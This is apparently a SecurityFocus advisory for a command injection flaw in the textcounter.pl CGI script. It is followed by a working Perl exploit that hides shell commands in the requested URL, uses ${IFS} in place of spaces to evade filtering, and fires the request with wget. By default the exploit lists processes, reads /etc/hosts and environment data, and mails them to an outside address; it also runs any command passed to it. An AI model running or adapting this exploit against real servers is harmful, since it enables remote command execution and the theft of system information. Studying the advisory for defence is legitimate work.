source: http://www.securityfocus.com/bid/2265/info

textcounter.pl is distributed through Matt's Scripts archive, and provides added features to httpd servers such as counters, guestbooks, and http cookie management. Due to insufficient checking of entered characters, it is possible for a remote user to input custom formatted strings into the $DOCUMENT_URI environment variable which, which when parsed can be executed as the UID of the httpd process. This makes it possible for a user with malicious intentions to execute arbitrary commands, and potentially gain access to the local host. 

#!/usr/bin/perl

$URL='http://dtp.kappa.ro/a/test.shtml';    # please _DO_ _modify_ this 
$EMAIL='pdoru@pop3.kappa.ro,root';          # please _DO_ _modify_ this


if ($ARGV[0]) {
   $CMD=$ARGV[0];
}else{
   $CMD="(ps ax;cd ..;cd ..;cd ..;cd etc;cat hosts;set)\|mail ${EMAIL} -sanothere_one";
}

$text="${URL}/;IFS=\8;${CMD};echo|";
$text =~ s/ /\$\{IFS\}/g;

#print "$text\n";

system({"wget"} "wget", $text, "-O/dev/null");
system({"wget"} "wget", $text, "-O/dev/null");
#system({"lynx"} "lynx", $text); 
#system({"lynx"} "lynx", $text);     # if you don't have "wget"
                                  # you can try with "Lynx"
